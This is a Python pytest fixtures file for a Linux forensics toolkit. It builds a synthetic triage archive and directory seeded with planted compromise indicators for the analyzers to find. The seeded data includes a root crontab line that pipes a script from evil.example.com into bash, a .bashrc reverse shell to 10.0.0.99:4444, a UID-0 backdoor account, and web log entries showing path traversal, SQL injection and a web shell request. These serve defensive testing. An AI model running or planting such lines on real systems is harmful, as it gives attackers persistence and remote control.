"""
Shared fixtures for the Linux Forensics Toolkit test suite.
"""

import io
import json
import os
import struct
import tarfile
import tempfile
from datetime import datetime

import pytest


# ---------------------------------------------------------------------------
# Helper
# ---------------------------------------------------------------------------

def _add_bytes(tar: tarfile.TarFile, name: str, data: bytes):
    """Helper: add an in-memory file to a tarfile."""
    info = tarfile.TarInfo(name=name)
    info.size = len(data)
    tar.addfile(info, io.BytesIO(data))


# ---------------------------------------------------------------------------
# Synthetic content
# ---------------------------------------------------------------------------

_HOSTNAME_CONTENT = b"testhost\n"

_PASSWD_CONTENT = (
    b"root:x:0:0:root:/root:/bin/bash\n"
    b"daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
    b"nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n"
    b"backdoor:x:0:0:backdoor:/root:/bin/bash\n"
)

_AUTH_LOG_CONTENT = (
    b"Jun  1 12:00:00 testhost sshd[1234]: Accepted publickey for root from 10.0.0.1 port 22 ssh2\n"
    b"Jun  1 12:01:00 testhost sshd[1235]: Failed password for invalid user admin from 192.168.1.100 port 54321 ssh2\n"
    b"Jun  1 12:02:00 testhost sudo:     root : TTY=pts/0 ; PWD=/root ; USER=root ; COMMAND=/usr/bin/apt update\n"
    b"Jun  1 12:03:00 testhost sshd[1236]: Accepted password for backdoor from 10.0.0.99 port 443 ssh2\n"
)

_HOSTS_CONTENT = (
    b"127.0.0.1\tlocalhost\n"
    b"::1\t\tlocalhost\n"
    b"10.0.0.50\tmalicious-c2.example.com\n"
    b"192.168.1.1\trouter.local\n"
)

_RESOLV_CONF_CONTENT = (
    b"nameserver 8.8.8.8\n"
    b"nameserver 1.1.1.1\n"
    b"nameserver 203.0.113.53\n"
)

_DPKG_LOG_CONTENT = (
    b"2025-01-15 10:30:00 install nmap:amd64 <none> 7.94+git20230101-1\n"
    b"2025-01-15 10:35:00 install curl:amd64 <none> 7.88.1-10\n"
    b"2025-01-15 11:00:00 remove apache2:amd64 2.4.57-2 <none>\n"
    b"2025-01-15 11:05:00 upgrade openssl:amd64 3.0.11-1 3.0.13-1\n"
)

_CRONTAB_CONTENT = (
    b"# /etc/crontab: system-wide crontab\n"
    b"SHELL=/bin/sh\n"
    b"PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n"
    b"\n"
    b"# m h dom mon dow user\tcommand\n"
    b"17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"
    b"*/5 * * * * root curl http://evil.example.com/beacon | bash\n"
)

_BASHRC_CONTENT = (
    b"# ~/.bashrc\n"
    b"alias ls='ls --color=auto'\n"
    b"bash -i >& /dev/tcp/10.0.0.99/4444 0>&1\n"
)

_WEB_ACCESS_LOG = (
    b'10.0.0.1 - - [15/Jan/2025:10:00:00 +0000] "GET /index.html HTTP/1.1" 200 1234 "-" "Mozilla/5.0"\n'
    b'10.0.0.2 - - [15/Jan/2025:10:01:00 +0000] "GET /admin/../../../etc/passwd HTTP/1.1" 404 0 "-" "curl/7.88"\n'
    b"10.0.0.3 - - [15/Jan/2025:10:02:00 +0000] \"GET /search?q=1' OR '1'='1 HTTP/1.1\" 200 500 \"-\" \"sqlmap/1.7\"\n"
    b'10.0.0.4 - - [15/Jan/2025:10:03:00 +0000] "POST /shell.php HTTP/1.1" 200 100 "-" "Mozilla/5.0"\n'
)

_IOC_FILE_CONTENT = (
    b"# IOC indicators\n"
    b"10.0.0.99\n"
    b"malicious-c2.example.com\n"
    b"evil.example.com\n"
)


def _make_wtmp_record(ut_type, user, terminal, host, timestamp):
    """Build a synthetic Linux utmp/wtmp binary record (384 bytes, x86_64)."""
    user_b = user.encode("utf-8")[:32].ljust(32, b"\x00")
    id_b = terminal[:4].encode("utf-8").ljust(4, b"\x00")
    line_b = terminal.encode("utf-8")[:32].ljust(32, b"\x00")
    pid = 1000
    host_b = host.encode("utf-8")[:256].ljust(256, b"\x00")
    ts_epoch = int(timestamp.timestamp()) if hasattr(timestamp, "timestamp") else timestamp

    record = struct.pack(
        "hi32s4s32sH2x256siii36x",
        ut_type,                  # ut_type (short)
        pid,                      # ut_pid  (int)
        line_b,                   # ut_line (char[32])
        id_b,                     # ut_id   (char[4])
        user_b,                   # ut_user (char[32])
        host_b,                   # ut_host (char[256])
        0,                        # exit status (int)
        0,                        # exit status (int)
        0,                        # session id (int)
        ts_epoch,                 # ut_tv.tv_sec (int)
        0,                        # ut_tv.tv_usec (int)
        0, 0, 0, 0,              # ut_addr_v6 (int[4])
        b"\x00" * 20,            # __unused (char[20])
    )
    # Pad to 384 bytes if needed
    if len(record) < 384:
        record += b"\x00" * (384 - len(record))
    return record[:384]


# ---------------------------------------------------------------------------
# Synthetic UAC tarball (enriched)
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_tarball(tmp_path):
    """Create a synthetic UAC .tar.gz with data for all analyzers."""
    tarball_path = tmp_path / "testhost-uac.tar.gz"
    prefix = "testhost-uac"
    with tarfile.open(str(tarball_path), "w:gz") as tar:
        _add_bytes(tar, f"{prefix}/etc/hostname", _HOSTNAME_CONTENT)
        _add_bytes(tar, f"{prefix}/etc/passwd", _PASSWD_CONTENT)
        _add_bytes(tar, f"{prefix}/var/log/auth.log", _AUTH_LOG_CONTENT)
        _add_bytes(tar, f"{prefix}/etc/hosts", _HOSTS_CONTENT)
        _add_bytes(tar, f"{prefix}/etc/resolv.conf", _RESOLV_CONF_CONTENT)
        _add_bytes(tar, f"{prefix}/var/log/dpkg.log", _DPKG_LOG_CONTENT)
        _add_bytes(tar, f"{prefix}/etc/crontab", _CRONTAB_CONTENT)
        _add_bytes(tar, f"{prefix}/root/.bashrc", _BASHRC_CONTENT)
        _add_bytes(tar, f"{prefix}/var/log/apache2/access.log", _WEB_ACCESS_LOG)
    return tarball_path


# ---------------------------------------------------------------------------
# Extracted UAC directory (enriched)
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_uac_dir(tmp_path):
    """Create a synthetic extracted UAC directory for all analyzers."""
    base = tmp_path / "testhost-extracted"

    # Directories
    for d in [
        "etc", "var/log", "var/log/apache2", "root",
        "var/spool/cron/crontabs", ".malware",
    ]:
        (base / d).mkdir(parents=True, exist_ok=True)

    # Core files
    (base / "etc" / "hostname").write_text("testhost\n")
    (base / "etc" / "passwd").write_bytes(_PASSWD_CONTENT)
    (base / "var" / "log" / "auth.log").write_bytes(_AUTH_LOG_CONTENT)
    (base / "etc" / "hosts").write_bytes(_HOSTS_CONTENT)
    (base / "etc" / "resolv.conf").write_bytes(_RESOLV_CONF_CONTENT)
    (base / "var" / "log" / "dpkg.log").write_bytes(_DPKG_LOG_CONTENT)
    (base / "etc" / "crontab").write_bytes(_CRONTAB_CONTENT)
    (base / "root" / ".bashrc").write_bytes(_BASHRC_CONTENT)
    (base / "var" / "log" / "apache2" / "access.log").write_bytes(_WEB_ACCESS_LOG)

    return base


# ---------------------------------------------------------------------------
# IOC file fixture
# ---------------------------------------------------------------------------

@pytest.fixture
def ioc_file(tmp_path):
    """Create a sample IOC indicator file."""
    path = tmp_path / "iocs.txt"
    path.write_bytes(_IOC_FILE_CONTENT)
    return path


# ---------------------------------------------------------------------------
# Config file fixtures
# ---------------------------------------------------------------------------

@pytest.fixture
def sample_config_file(tmp_path):
    """Write a default-ish JSON config file and return its path."""
    cfg_path = tmp_path / "test_config.json"
    cfg_path.write_text(json.dumps({
        "quiet": True,
        "parallel": False,
        "gap_threshold_hours": 12.0,
        "analyzers_enabled": {
            "memory": False,
        },
    }, indent=2))
    return cfg_path


@pytest.fixture
def empty_config_file(tmp_path):
    """An empty JSON object — all defaults should apply."""
    cfg_path = tmp_path / "empty_config.json"
    cfg_path.write_text("{}")
    return cfg_path
